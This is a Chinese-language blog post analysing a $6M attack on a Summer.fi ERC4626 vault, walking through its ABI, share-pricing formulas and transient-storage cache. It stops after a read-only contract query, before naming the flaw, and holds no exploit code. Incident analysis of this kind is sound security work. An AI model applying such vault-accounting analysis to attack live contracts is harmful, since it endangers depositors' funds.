---
title: "Summer.fi $6M Attack Analysis"
date: 2026-07-21T10:01:57+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["security", "attack", "Summer.fi"]
---

Summer.fi $6M Attack Analysis

<!--more-->

## 基本信息

summer.fi 合约被攻击导致 $6M 损失

Chain ID:  1

攻击 TX: `0x0db528c44f23fc7fa4544684a2fab81096450a14aae8bc89f42cd0592d43da12` (block 25471348)

TARGET: `0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17`

分析 fork 高度: **25471347**（攻击前一个 block）



## Target 基本信息

`0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17`

Source Verification : Verified on Etherscan

Is Proxy : No

Contract Name : FleetCommander

Name: LazyVault_LowerRisk_USDC

Symbol: LVUSDC

对外接口:

```
Resolved Functions — 0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17
(ABI rows are confirmed via a verified contract ABI. Guess rows are signature-database matches on a raw selector found in bytecode — the actual name may differ due to selector collisions.)
(Mutability from a verified ABI is authoritative; a trailing "?" marks a value inferred from bytecode, which may be wrong. State-changing functions are listed first — start audits there.)

ABI
  State-changing:
  
  Source | Mutability   | Selector   | Signature
  ------ | ------------ | ---------- | ---------
  ABI   | nonpayable   | 0xe37d5b7f | addArk(address)
  ABI   | nonpayable   | 0x095ea7b3 | approve(address,uint256)(bool)
  ABI   | nonpayable   | 0x6e553f65 | deposit(uint256,address)(uint256)
  ABI   | nonpayable   | 0xfaa9bce9 | deposit(uint256,address,bytes)(uint256)
  ABI   | nonpayable   | 0xefb6a26e | forceRebalance(tuple[])
  ABI   | nonpayable   | 0x94bf804d | mint(uint256,address)(uint256)
  ABI   | nonpayable   | 0x8456cb59 | pause()
  ABI   | nonpayable   | 0xed754121 | rebalance(tuple[])
  ABI   | nonpayable   | 0xba087652 | redeem(uint256,address,address)(uint256)
  ABI   | nonpayable   | 0x3a7c9f0e | redeemFromArks(uint256,address,address)(uint256)
  ABI   | nonpayable   | 0xf3577816 | redeemFromBuffer(uint256,address,address)(uint256)
  ABI   | nonpayable   | 0x96c25a38 | removeArk(address)
  ABI   | nonpayable   | 0x34050560 | setArkDepositCap(address,uint256)
  ABI   | nonpayable   | 0xf3ba553e | setArkMaxDepositPercentageOfTVL(address,uint256)
  ABI   | nonpayable   | 0xd45a07a1 | setArkMaxRebalanceInflow(address,uint256)
  ABI   | nonpayable   | 0xb637766c | setArkMaxRebalanceOutflow(address,uint256)
  ABI   | nonpayable   | 0xd902d41a | setFleetDepositCap(uint256)
  ABI   | nonpayable   | 0xc37007c2 | setFleetTokenTransferability()
  ABI   | nonpayable   | 0x133ab579 | setMaxRebalanceOperations(uint256)
  ABI   | nonpayable   | 0x4daecb9c | setMinimumBufferBalance(uint256)
  ABI   | nonpayable   | 0xe193858f | setMinimumPauseTime(uint256)
  ABI   | nonpayable   | 0x5822198f | setTipRate(uint256)
  ABI   | nonpayable   | 0x2755cd2d | tip()(uint256)
  ABI   | nonpayable   | 0xa9059cbb | transfer(address,uint256)(bool)
  ABI   | nonpayable   | 0x23b872dd | transferFrom(address,address,uint256)(bool)
  ABI   | nonpayable   | 0x3f4ba83a | unpause()
  ABI   | nonpayable   | 0xdc9de0a8 | updateRebalanceCooldown(uint256)
  ABI   | nonpayable   | 0x93417052 | updateStakingRewardsManager()
  ABI   | nonpayable   | 0xb460af94 | withdraw(uint256,address,address)(uint256)
  ABI   | nonpayable   | 0xa039e944 | withdrawFromArks(uint256,address,address)(uint256)
  ABI   | nonpayable   | 0x5f538f6f | withdrawFromBuffer(uint256,address,address)(uint256)
  
  Read-only:
  
  Source | Mutability   | Selector   | Signature
  ------ | ------------ | ---------- | ---------
  ABI   | view         | 0xa89f38a3 | ADMIRALS_QUARTERS_ROLE()(bytes32)
  ABI   | view         | 0xc0b534c2 | DECAY_CONTROLLER_ROLE()(bytes32)
  ABI   | view         | 0xccc57490 | GOVERNOR_ROLE()(bytes32)
  ABI   | view         | 0x24ea54f4 | GUARDIAN_ROLE()(bytes32)
  ABI   | view         | 0xa0506f0b | INITIAL_MINIMUM_PAUSE_TIME()(uint256)
  ABI   | view         | 0x5ed975e5 | MAX_REBALANCE_OPERATIONS()(uint256)
  ABI   | view         | 0x66e943f1 | SUPER_KEEPER_ROLE()(bytes32)
  ABI   | view         | 0xdd62ed3e | allowance(address,address)(uint256)
  ABI   | view         | 0xff32a42a | arks(uint256)(address)
  ABI   | view         | 0x38d52e0f | asset()(address)
  ABI   | view         | 0x70a08231 | balanceOf(address)(uint256)
  ABI   | view         | 0xc8169aa1 | bufferArk()(address)
  ABI   | view         | 0x79502c55 | config()(address,uint256,uint256,uint256,address)
  ABI   | view         | 0xc9c667e3 | configurationManager()(address)
  ABI   | view         | 0x07a2d13a | convertToAssets(uint256)(uint256)
  ABI   | view         | 0xc6e6f592 | convertToShares(uint256)(uint256)
  ABI   | view         | 0x313ce567 | decimals()(uint8)
  ABI   | view         | 0x565974d3 | details()(string)
  ABI   | view         | 0xf7e533ec | fleetCommanderRewardsManagerFactory()(address)
  ABI   | pure         | 0x69b3054b | generateRole(uint8,address)(bytes32)
  ABI   | view         | 0x240ecd60 | getActiveArks()(address[])
  ABI   | view         | 0xc3f909d4 | getConfig()(tuple)
  ABI   | view         | 0x218e4a15 | getCooldown()(uint256)
  ABI   | view         | 0xef2fc472 | getEffectiveArkDepositCap(address)(uint256)
  ABI   | view         | 0x3152d5d1 | getLastActionTimestamp()(uint256)
  ABI   | view         | 0x5b0f83f3 | harborCommand()(address)
  ABI   | view         | 0xebc136d0 | hasAdmiralsQuartersRole(address)(bool)
  ABI   | view         | 0xd206a059 | isArkActiveOrBufferArk(address)(bool)
  ABI   | view         | 0x71aedbc1 | lastTipTimestamp()(uint256)
  ABI   | view         | 0x9265b76e | maxBufferRedeem(address)(uint256)
  ABI   | view         | 0x3e314c76 | maxBufferWithdraw(address)(uint256)
  ABI   | view         | 0x402d267d | maxDeposit(address)(uint256)
  ABI   | view         | 0xc63d75b6 | maxMint(address)(uint256)
  ABI   | view         | 0xd905777e | maxRedeem(address)(uint256)
  ABI   | view         | 0xce96cb77 | maxWithdraw(address)(uint256)
  ABI   | view         | 0x680e57ab | minimumPauseTime()(uint256)
  ABI   | view         | 0x06fdde03 | name()(string)
  ABI   | view         | 0x94d7eaa4 | pauseStartTime()(uint256)
  ABI   | view         | 0x5c975abb | paused()(bool)
  ABI   | view         | 0xef8b30f7 | previewDeposit(uint256)(uint256)
  ABI   | view         | 0xb3d7f6b9 | previewMint(uint256)(uint256)
  ABI   | view         | 0x4cdad506 | previewRedeem(uint256)(uint256)
  ABI   | view         | 0x83cf3d4a | previewTip(address,uint256)(uint256)
  ABI   | view         | 0x0a28a477 | previewWithdraw(uint256)(uint256)
  ABI   | view         | 0x117d8ae0 | raft()(address)
  ABI   | view         | 0x95d89b41 | symbol()(string)
  ABI   | view         | 0x7aaceb95 | tipJar()(address)
  ABI   | view         | 0x498e76a0 | tipRate()(uint256)
  ABI   | view         | 0x01e1d114 | totalAssets()(uint256)
  ABI   | view         | 0x18160ddd | totalSupply()(uint256)
  ABI   | view         | 0xbef97c87 | transfersEnabled()(bool)
  ABI   | view         | 0x61d027b3 | treasury()(address)
  ABI   | view         | 0xd570ee47 | withdrawableTotalAssets()(uint256)
```

从对外接口信息可以看出 该合约是一个 ERC4626 标准代币化金库，管理多个底层策略（称为 Ark）。用户可以通过 deposit/mint 存入底层资产（由 asset() 返回）获得份额代币（ERC20），并通过 redeem/withdraw 赎回资产。合约支持再平衡操作（rebalance/forceRebalance），由授权角色将资金在 Ark 之间重新分配。此外，合约具有小费机制（tip/tipRate/tipJar），允许向小费罐支付费用。合约还包含暂停功能（pause/unpause）、权限控制（多个角色如 GOVERNOR、GUARDIAN 等）、以及一系列可配置参数（如存款上限、再平衡限制、缓冲区余额等）。关键状态变更操作需要特定角色权限。

> 既然是 Verified 合约, 所以源代码下载在本文中全程略过, 在需要使用源代码的时候我会直接给出源代码

## 重点关注函数

作为 ERC4626, 那么自然关注重点就是

入口: `deposit(uint256,address)` `deposit(uint256,address,bytes)(uint256)` / `mint(uint256,address)` 
出口: `withdraw(uint256,address,address)` / `redeem(uint256,address,address)`
预览: `previewDeposit` / `previewMint` / `previewRedeem` / `previewWithdraw`
换算: `convertToShares` / `convertToAssets`



## deposit(uint256,address)(uint256)

用户存款函数 (存入真实资产得到代币, 以后可以凭代币赎回资产)

*其中 deposit(uint256,address,bytes)(uint256) 是 OpenZeppelin 扩展版（非标准）内部也调用的是 deposit(uint256,address)(uint256)* 

### 函数签名分析

```solidity
function deposit(uint256 assets, address receiver)
    public override collectTip useCache whenNotPaused
    returns (uint256 shares)
```

三个 modifier 按 `collectTip → useCache → whenNotPaused` 顺序包裹函数体。

Solidity modifier 的执行顺序：越靠左越外层，最先进入、最后退出。

1, collectTip

```solidity
modifier collectTip() {
	// 在瞬态存储设 flag。影响 totalSupply() 的行为: 
	// 当 _isCollectingTip() == true 时 
	// 		totalSupply()` 返回 `super.totalSupply()`（不计入 pending tip）；
	// 为 false 时
	//		返回 `super.totalSupply() + previewTip(...)`（计入 pending tip）
    _setIsCollectingTip(true);     
    
    // 结算从上次 tip 到现在累积的小费，按年化利率（最大 5%）给 tipJar mint 新的 share。
    // 这会增大 super.totalSupply()。
    _accrueTip(tipJar(), totalSupply());
    _;                                     // 执行函数体
    _setIsCollectingTip(false);            // 清除标志位
}
```

影响：deposit 函数体内调用的 `previewDeposit` → `totalSupply()` 此时返回的是 tip 结算后的真实 supply。



2, useCache

```solidity
modifier useCache() {
    _getArksData(config.bufferArk);   // 填充瞬态缓存
    _;                                // 执行函数体  
    _flushCache();                    // 清空瞬态缓存
}
```

其中

**`_getArksData` 做了什么**：

1. 检查 `IS_TOTAL_ASSETS_CACHED` 是否已经 true（同一 tx 内第二次调用时命中缓存）

2. 调 `getActiveArks()` 获取所有活跃 Ark 地址列表

   活跃ARK列表如下:

   ```
   Output 0 (address[]) : 
   [0xC9dd080C9ecCFcdbf379714D84CdC8Bd01046AE1, 0xedC6a603B31391B7D13fBa6A721fd4DDa401f9eA, 0xDB6d68d571FbEF7D67827844DD800884EA9cc02E, 0x36D0501D07619274a398AFf16007337041873A6F, 0xCCBd61b6c2fB58Da5bbD8937Ca25164eF29c1cc4, 0x165D1accC5C6326e7EE4deeF75Ac3ffC8ce4D79B, 0xCa75E855a33acC44DDA9d48578Df5Df7602b5c35, 0x78f466314b2A69685e464431eDF7688cB77De131, 0x99d21C9c1D68CE0e9bbF77AE0c965Daa3Ab02c7e, 0x1Ae10e9425653177282E6054a5c828391a533aC7, 0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34, 0xb5e9c7Ad5bB1e21B12aD62066FF1Fb388ebdeB37, 0x8948a5F3D24F7A6d50FF36064e8cff33B2aF062f, 0x9890C99f504337C3500AC05c267c38dfcd41C3e2, 0xf8Db64D39D1c7382fE47De8B72435c7e9DFB2894, 0x3F9e195a8ee39Ed7B4a14A919F4a165c872976e5, 0x756ca6D02523c908972C4F82a4821c15F740D275, 0x679794389B05B0db3CbEdAcC908ff8Fb531fA53f, 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2, 0x7B1e86949C7B74761046d79Fb457985FB3a494F3, 0xcA2e14c7C03C9961c296C89e2d2279F5F7DB15b4, 0x0C939b702524fDaBa4914E905Bcb850182308141, 0x77e5f42d5cf2d1B9849AE6A5d2D7dC5b774f8290, 0x47F73542a9b59C2316832775C51cC99E6B468A67, 0x565a4c04E32fBf001AE36C4fB60584A687Ffa27C, 0xeBA9b3d4336802CcfbDB80AfBDA820e9Eef97f8e, 0xd0aAdDe147b6D683cBb80bFE0Fb9e8dB9De1958F, 0x81f025C87367033d87B6d3A95289B36106770B25, 0x857a0CaC1Ac29d8101822f8879E4e6918293c7b5]
   ```

   

3. 逐个调 `IArk(ark).totalAssets()` → 外部合约调用

4. 加上 `bufferArk.totalAssets()`

5. 总和存入瞬态存储 `TOTAL_ASSETS_STORAGE`

缓存使用瞬态存储（tload/tstore），只在当前交易内有效，tx 结束自动清空。不需要像传统 storage 那样手动清 slot 退 gas。



3, whenNotPaused

```
    modifier whenNotPaused() {
        _requireNotPaused();
        _;
    }
    
    function _requireNotPaused() internal view virtual {
        if (paused()) {
            revert EnforcedPause();
        }
    }
```

探测业务是否已经暂停



### 函数体分析

```solidity
    {
        // 检查存款数量不能为0 也不能超过最大值
        _validateDeposit(assets, _msgSender());

		// 记录（仅用于 emit）
        uint256 previousFundsBufferBalance = config.bufferArk.totalAssets();

		// 计算应该mint给用户多少个代币
        shares = previewDeposit(assets);
        
        // openzepplin 库函数: 
        // 划转用户想存入的资产(USDC)
        // 然后mint并将shares数量的代币转给用户制定的地址(receiver)
        _deposit(_msgSender(), receiver, assets, shares);
        // 将USDC转进bufferArk
        _board(address(config.bufferArk), assets);

        emit FundsBufferBalanceUpdated(
            _msgSender(),
            previousFundsBufferBalance,
            config.bufferArk.totalAssets()
        );
    }
```

其中 config 为:

```
Raw Output (160 bytes) : 0x000000000000000000000000106cbb1f445f0bffa7894f4199ee940bf7f6dd2b000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000044364c5bb0000000000000000000000000000000000000000000000000000000000000000032000000000000000000000000b1a851b8c70a4749408754d398702153a61dfc78
```

解码后得到对应字段值为

```solidity
struct FleetConfig {
    /**
     * @notice The buffer Ark associated with this FleetCommander
     * @dev This Ark is used as a temporary holding area for funds before they are allocated
     *      to other Arks or when they need to be quickly accessed for withdrawals.
     */
    IArk bufferArk; // 0x106CBB1F445F0bFFa7894F4199EE940BF7f6dD2B
    /**
     * @notice The minimum balance that should be maintained in the buffer Ark
     * @dev This value is used to ensure there's always a certain amount of funds readily
     *      available for withdrawals or rebalancing operations. It's denominated in the
     *      smallest unit of the underlying asset (e.g., wei for ETH).
     */
    uint256 minimumBufferBalance; // 1000000000
    /**
     * @notice The maximum total value of assets that can be deposited into the FleetCommander
     * @dev This cap helps manage the total assets under management and can be used to
     *      implement controlled growth strategies. It's denominated in the smallest unit
     *      of the underlying asset.
     */
    uint256 depositCap; // 75000000000000
    /**
     * @notice The maximum number of rebalance operations in a single rebalance
     */
    uint256 maxRebalanceOperations; // 50
    /**
     * @notice The address of the staking rewards contract
     */
    address stakingRewardsManager; // 0xB1A851b8c70A4749408754d398702153A61DFc78
}
```



## previewDeposit(uint256)(uint256)

既然上面已经使用到了previewDeposit, 那么我们就接着分析这个函数

```solidity
// 计算应该mint给用户多少个代币
shares = previewDeposit(assets);
```

`previewDeposit` 是 ERC‑4626 代币化金库标准中的预览函数，用于在链上或链下模拟当前区块下执行 `deposit` 操作后会获得的 Vault 份额数量,允许集成者（如前端、合约）在不实际执行交易的情况下，估算存入 `assets` 数量的基础资产后将获得的 `shares`。它返回的是**理论上限**，即实际 `deposit` 调用在同一交易中返回的份额应**等于或略高于** `previewDeposit` 的值。

它使用的是openzepplin提供的ERC4626实现中的函数

```solidity
    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        return _convertToShares(assets, Math.Rounding.Floor);
    }
    
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }
```

也就是说挖多少代币给用户由三个变量决定

- 用户存入的资产数量: assets
- 合约的 totalSupply()
- 合约的 totalAssets()

> shares = floor(assets × totalSupply() / totalAssets())



## totalSupply()

```solidity

    /**
     * @dev Overrides the totalSupply function to include the tip shares
     * @dev This is done to ensure that the totalSupply is always accurate, even when tips are being accrued
     * @dev This is done by checking if the _isCollectingTip flag is set, and if it is, return the totalSupply
     * @dev If the _isCollectingTip flag is not set, then we need to accrue the tips and return the totalSupply + the
     * previewTip
     * @dev when collecting fee we require totalSupply to be the pre tip totalSupply, after the tip is collected the
     * totalSupply will include the tip shares
     * @dev when called in view functions we need to return the totalSupply + the previewTip
     * @return uint256 The total supply of the FleetCommander, including tip shares
     */
    function totalSupply()
        public
        view
        override(ERC20, IERC20)
        returns (uint256)
    {
        if (_isCollectingTip()) {
            return super.totalSupply();
        }
        uint256 _totalSupply = super.totalSupply();
        return _totalSupply + previewTip(tipJar(), _totalSupply);
    }
```

`totalSupply()` 的重写，核心目的是在“小费（tip）”累积期间精确控制总供应量的表示，以确保合约在不同操作场景下的行为正确

常规情况：总供应量应始终等于 `ERC20` 的基础供应量（`super.totalSupply()`）加上已累积但尚未正式计入的“小费份额”。

收集费用（或小费）期间：合约内部逻辑（如 `collectTip` 函数）在执行过程中，需要基于“小费计入前”的总供应量来计算费用或份额分配。如果此时 `totalSupply` 已经包含了未完全确定的 `previewTip`，则会导致计算偏差。

view函数调用：在外部查询时，我们期望 `totalSupply` 能反映当前实际存在的所有份额（包括已产生但尚未通过 `collectTip` 正式铸造的份额），因此需要动态加上 `previewTip`。

我在最开始在分析modifier的时候已经注意到

```solidity
modifier collectTip() {
    _setIsCollectingTip(true);   
    //...
}
```

所以在 Deposit 期间, 返回的 `totalSupply` 就是质朴的 `ERC20.totalSupply()`



## totalAssets()

```solidity
    function totalAssets()
        public
        view
        override(IFleetCommander, ERC4626)
        returns (uint256)
    {
        return _totalAssets(config.bufferArk);
    }
```

然后跳转到 `src/contracts/FleetCommanderCache.sol`

FleetCommanderCache合约在注释中已经说明, 这个合约是为了优化gas, 减少对ark的外部调用次数

```solidity
    function _totalAssets(
        IArk bufferArk
    ) internal view returns (uint256 total) {
        bool isTotalAssetsCached = StorageSlots
            .IS_TOTAL_ASSETS_CACHED_STORAGE
            .asBoolean()
            .tload();
        if (isTotalAssetsCached) {
            return StorageSlots.TOTAL_ASSETS_STORAGE.asUint256().tload();
        }
        return
            _sumTotalAssets(_getAllArks(_getActiveArksAddresses(), bufferArk));
    }
    
    
    function _sumTotalAssets(
        IArk[] memory _arks
    ) private view returns (uint256 total) {
        for (uint256 i = 0; i < _arks.length; i++) {
            total += _arks[i].totalAssets();
        }
    }
    
    function _getAllArks(
        address[] memory arks,
        IArk bufferArk
    ) private pure returns (IArk[] memory) {
        IArk[] memory allArks = new IArk[](arks.length + 1);
        for (uint256 i = 0; i < arks.length; i++) {
            allArks[i] = IArk(arks[i]);
        }
        allArks[arks.length] = IArk(bufferArk);
        return allArks;
    }
    
    // 注意, _getActiveArksAddresses被src/contracts/FleetCommander.sol override了
    // 所以这里是FleetCommander.sol中的 _getActiveArksAddresses被src
    function _getActiveArksAddresses()
        internal
        view
        override(FleetCommanderCache)
        returns (address[] memory)
    {
        return getActiveArks();
    }

```

在业务上，FleetCommander 并不是把所有资产放在一个池子里，而是分散投资到多个 `Ark` 策略中（类似多个子基金）。

- Active Arks（活跃 Ark）：当前生效的收益策略池，负责资产增值。
- BufferArk（缓冲池）：一个特殊的 Ark，通常存放闲置资金或即时流动性（用于应对提款），它不参与收益策略，但仍然是金库总资产的一部分。

核心痛点：外部调用（`ark.totalAssets()`）极其昂贵,如果直接计算，逻辑很简单

```solidity
for each ark in arks:
    total += ark.totalAssets()  // 跨合约调用，Gas 极高
```

如果一笔交易中（例如用户存款/取款）多次触发 `totalAssets()` 计算，会导致 Gas 暴涨。

解决方案是瞬态存储缓存（EIP-1153）, 到目前为止这不是重点, 重点是我们知道了

**总资产(`totalAssets()`) = 所有活跃 Ark 的资产 + BufferArk 的资产**。



## 存款路径阶段性总结

通过上面的分析我们知道了用户deposit的时候, 给用户shares数量计算公式是

`shares = floor(assets × totalSupply() / sum_of_assets_of_all_arks)`

其中:

totalSupply() : 就是单纯的 IECR20.totalSupply()

sum_of_assets_of_all_arks: 所有Ark的总资产总和(包括buffer_ark)

为了节约对外部Ark的调用的gas费用, 创建了 `FleetCommanderCache.sol`, 并通过 `useCache` 这个modifier来使用了它



下面看用户提款路径

## withdraw(uint256,address,address)(uint256) redeem(uint256,address,address)(uint256)

```solidity


    /// @inheritdoc IFleetCommander
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    )
        public
        override(ERC4626, IFleetCommander)
        collectTip
        useCache
        whenNotPaused
        returns (uint256 assets)
    {
        uint256 bufferBalance = config.bufferArk.totalAssets();
        uint256 bufferBalanceInShares = convertToShares(bufferBalance);

        if (shares == Constants.MAX_UINT256) {
            shares = balanceOf(owner);
        }

        if (shares <= bufferBalanceInShares) {
            assets = redeemFromBuffer(shares, receiver, owner);
        } else {
            assets = redeemFromArks(shares, receiver, owner);
        }
    }

    /// @inheritdoc IFleetCommander
    function redeemFromBuffer(
        uint256 shares,
        address receiver,
        address owner
    ) public collectTip useCache whenNotPaused returns (uint256 assets) {
        _validateBufferRedeem(shares, owner);

        uint256 previousFundsBufferBalance = config.bufferArk.totalAssets();

        assets = previewRedeem(shares);
        _disembark(address(config.bufferArk), assets);
        _withdraw(_msgSender(), receiver, owner, assets, shares);

        emit FundsBufferBalanceUpdated(
            _msgSender(),
            previousFundsBufferBalance,
            config.bufferArk.totalAssets()
        );
    }
    
    /// @inheritdoc IFleetCommander
    function redeemFromArks(
        uint256 shares,
        address receiver,
        address owner
    )
        public
        override(IFleetCommander)
        collectTip
        useWithdrawCache
        whenNotPaused
        returns (uint256 totalAssetsToWithdraw)
    {
        _validateRedeemFromArks(shares, owner);

        totalAssetsToWithdraw = previewRedeem(shares);
        _forceDisembarkFromSortedArks(totalAssetsToWithdraw);
        _withdraw(_msgSender(), receiver, owner, totalAssetsToWithdraw, shares);
        _resetLastActionTimestamp();
        emit FleetCommanderRedeemedFromArks(owner, receiver, shares);
    }

    /// @inheritdoc IFleetCommander
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    )
        public
        override(ERC4626, IFleetCommander)
        collectTip
        useCache
        whenNotPaused
        returns (uint256 shares)
    {
        uint256 bufferBalance = config.bufferArk.totalAssets();

        if (assets == Constants.MAX_UINT256) {
            uint256 totalUserShares = balanceOf(owner);
            assets = previewRedeem(totalUserShares);
        }

        if (assets <= bufferBalance) {
            shares = withdrawFromBuffer(assets, receiver, owner);
        } else {
            shares = withdrawFromArks(assets, receiver, owner);
        }
    }
    
    /// @inheritdoc IFleetCommander
    function withdrawFromBuffer(
        uint256 assets,
        address receiver,
        address owner
    ) public whenNotPaused collectTip useCache returns (uint256 shares) {
        shares = previewWithdraw(assets);
        _validateBufferWithdraw(assets, shares, owner);

        uint256 prevQueueBalance = config.bufferArk.totalAssets();

        _disembark(address(config.bufferArk), assets);
        _withdraw(_msgSender(), receiver, owner, assets, shares);

        emit FundsBufferBalanceUpdated(
            _msgSender(),
            prevQueueBalance,
            config.bufferArk.totalAssets()
        );
    }

    /// @inheritdoc IFleetCommander
    function withdrawFromArks(
        uint256 assets,
        address receiver,
        address owner
    )
        public
        override(IFleetCommander)
        collectTip
        useWithdrawCache
        whenNotPaused
        returns (uint256 totalSharesToRedeem)
    {
        totalSharesToRedeem = previewWithdraw(assets);

        _validateWithdrawFromArks(assets, totalSharesToRedeem, owner);

        _forceDisembarkFromSortedArks(assets);
        _withdraw(_msgSender(), receiver, owner, assets, totalSharesToRedeem);
        _resetLastActionTimestamp();

        emit FleetCommanderWithdrawnFromArks(owner, receiver, assets);
    }

    

```

搞了一堆函数, 意思就是如果buffer ark足够应付, 就从buffer ark 提钱, 不够, 就从arks提钱

核心是

1, `useCache`这个modifier 表明使用了`FleetCommanderCache.sol`这个缓存机制

2, `collectTip` 这个modifier 表明接下来用到totalSupply() : 就是单纯的 IECR20.totalSupply()

以及 3,

```
totalSharesToRedeem = previewWithdraw(assets);
或
totalAssetsToWithdraw = previewRedeem(shares);
```

来到了 openzepplin的ERC4626标准实现

```solidity

    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {
        return _convertToShares(assets, Math.Rounding.Ceil);
    }

    function previewRedeem(uint256 shares) public view virtual returns (uint256) {
        return _convertToAssets(shares, Math.Rounding.Floor);
    }
    
    function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual returns (uint256) {
        return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** _decimalsOffset(), rounding);
    }
```

很简单, 要给用户返回多少底层资产,由3个参数决定

- 用户要花掉的shares数量
- totalAssets()
- totalSupply()

`assets = floor( shares × sum_of_assets_of_all_arks / totalSupply() )`



## 存款取款路径阶段性总结

存款的时候 用户用底层资产assets能得到多少shares的计算公式是

`shares = floor(assets × totalSupply() / sum_of_assets_of_all_arks)`

取款的时候, 用户用shares能换回多少底层资产的计算公式为

`assets = floor( shares × sum_of_assets_of_all_arks / totalSupply() )`

为了节约对外部Ark的调用的gas费用, 创建了 `FleetCommanderCache.sol`, 并通过 `useCache` 这个modifier来使用了它

totalSupply() : 就是单纯的 IECR20.totalSupply(), 也直接调用 FleetCommander.totalSupply(), 非常简单

assets shares 是用户传入的参数(或根据传入参数简单计算出来的临时值), 也很简单

sum_of_assets_of_all_arks: 所有Ark的总资产总和(包括buffer_ark), 它是通过下面的函数得到的

```solidity
    function _totalAssets(
        IArk bufferArk
    ) internal view returns (uint256 total) {
        bool isTotalAssetsCached = StorageSlots
            .IS_TOTAL_ASSETS_CACHED_STORAGE
            .asBoolean()
            .tload();
        if (isTotalAssetsCached) {
            return StorageSlots.TOTAL_ASSETS_STORAGE.asUint256().tload();
        }
        return
            _sumTotalAssets(_getAllArks(_getActiveArksAddresses(), bufferArk));
    }
    
    function _sumTotalAssets(
        IArk[] memory _arks
    ) private view returns (uint256 total) {
        for (uint256 i = 0; i < _arks.length; i++) {
            total += _arks[i].totalAssets();
        }
    }
```



所以唯一复杂的就是搞清楚缓存机制, 什么时候使用缓存, 什么时候遍历所有Arks来调用Ark自己的totalAssets()函数(注意, 不是FleetCommander.totalAssets, 是外部合约的totalAssets函数), 缓存什么时候失效

## FleetCommanderCache

回到存款和取款都会用到的 `useCache` modifier

```solidity
    modifier useCache() {
        _getArksData(config.bufferArk);
        _;
        _flushCache();
    }
```

```solidity
    function _getArksData(
        IArk bufferArk
    ) internal returns (ArkData[] memory _arksData) {
        if (StorageSlots.IS_TOTAL_ASSETS_CACHED_STORAGE.asBoolean().tload()) {
            return _getAllArksDataFromCache();
        }

        address[] memory arks = _getActiveArksAddresses();
        // Initialize data for all arks
        _arksData = new ArkData[](arks.length + 1); // +1 for buffer ark
        uint256 totalAssets = 0;

        // Populate data for regular arks
        for (uint256 i = 0; i < arks.length; i++) {
            uint256 arkAssets = IArk(arks[i]).totalAssets();
            _arksData[i] = ArkData(arks[i], arkAssets);
            totalAssets += arkAssets;
        }

        // Add buffer ark data
        uint256 bufferArkAssets = bufferArk.totalAssets();
        _arksData[arks.length] = ArkData(address(bufferArk), bufferArkAssets);
        totalAssets += bufferArkAssets;

        _cacheAllArksTotalAssets(totalAssets);
        _cacheAllArks(_arksData);
    }
```

```solidity
    function _flushCache() internal {
        StorageSlots.IS_TOTAL_ASSETS_CACHED_STORAGE.asBoolean().tstore(false);
        StorageSlots
            .IS_WITHDRAWABLE_ARKS_TOTAL_ASSETS_CACHED_STORAGE
            .asBoolean()
            .tstore(false);
        StorageSlots.WITHDRAWABLE_ARKS_LENGTH_STORAGE.asUint256().tstore(0);
        StorageSlots.ARKS_LENGTH_STORAGE.asUint256().tstore(0);
    }
```

所以很清楚: 

每一笔成功的存款或取务操作, 缓存都会在业务结束后将cache标记为失效, 下次存款或取款的时候会遍历各个Ark重新获取数据(比如`totalAssets += arkAssets`)

另外 `tstore` 表明是 EIP-1153 , 用到了瞬态存储, 瞬态存储的物理存活期只有本Tx (`TLOAD` / `TSTORE` 的 Gas 成本远低于 `SLOAD` / `SSTORE`（热存储），也比外部合约调用（`CALL`）便宜得多)

所以代码采用了双保险:
1,主动清空（业务层): 每笔存款/取款操作执行完毕后，立即调用 `_flushCache()` 清除瞬态缓存。目的是强制下一笔操作重新计算汇率，保证同一交易内多次操作的数据精度。

2, 被动清空（底层 EVM): 基于 EIP-1153 特性，当前交易（或子调用回滚）结束时，瞬态存储自动消亡。目的是防止任何异常情况（如代码漏清、异常中断）导致脏数据污染下一笔交易

既然用完就扔,为什么好需要缓存:

因为在一次业务类, _totalAssets 会被调用多次, 假设要给ark调用4次, 29个ark 全部116次, 瞬态存储会节约很多gas



## 阶段性总结

存款的时候 用户用底层资产assets能得到多少shares的计算公式是

`shares = floor(assets × totalSupply() / sum_of_assets_of_all_arks)`

取款的时候, 用户用shares能换回多少底层资产的计算公式为

`assets = floor( shares × sum_of_assets_of_all_arks / totalSupply() )`

为了节约对外部Ark的调用的gas费用, 创建了 `FleetCommanderCache.sol`, 并通过 `useCache` 这个modifier来使用了它

totalSupply() : 就是单纯的 IECR20.totalSupply(), 也直接调用 FleetCommander.totalSupply(), 非常简单

assets shares 是用户传入的参数(或根据传入参数简单计算出来的临时值), 也很简单

sum_of_assets_of_all_arks: 所有Ark的总资产总和(包括buffer_ark), 每一笔存款或取款成功之后都会让缓存失效,然后下次存款或取款的时候遍历每个ark的 `IArk(arks[i]).totalAssets()` 来进行累加得到`sum_of_assets_of_all_arks` , 也就是 `FleetCommander.totalAssets()`

那么下面自然地就来看看各个Ark对如何对外暴露自己的 `IArk.totalAssets()`的

## 各个Ark向外汇报的 IArk.totalAssets()

### 获取各个Ark的地址

外部Ark

```
cast call '0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17' 'getActiveArks()' --from '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' --block 25471347 --rpc-url $RPC_ETH
```

得到

```
Output 0 (address[]) : 
